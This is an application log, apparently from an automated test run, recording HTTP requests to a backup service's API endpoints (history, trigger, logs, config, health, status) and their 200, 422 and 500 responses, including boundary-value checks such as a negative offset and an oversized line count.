2026-04-14 15:49:30,496 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?offset=-1 "HTTP/1.1 422 Unprocessable Entity"
2026-04-14 15:49:30,502 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-14 15:49:30,505 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:49:30,518 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-14 15:49:30,521 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:49:30,533 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-14 15:49:30,536 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:49:30,551 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:30,554 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs?lines=10 "HTTP/1.1 200 OK"
2026-04-14 15:49:30,558 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:30,561 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-14 15:49:30,564 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:30,567 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs?lines=10000 "HTTP/1.1 422 Unprocessable Entity"
2026-04-14 15:49:30,570 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-14 15:49:30,573 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 200 OK"
2026-04-14 15:49:30,577 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-14 15:49:30,580 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:49:30,592 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/health
2026-04-14 15:49:30,595 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/health "HTTP/1.1 200 OK"
2026-04-14 15:49:30,600 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:30,603 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:30,605 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-14 15:49:30,607 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 200 OK"
2026-04-14 15:49:30,609 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:30,612 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history "HTTP/1.1 200 OK"
2026-04-14 15:49:30,614 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:30,616 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-14 15:49:30,620 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:30,623 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:30,647 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:30,650 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-14 15:49:30,657 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:30,659 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
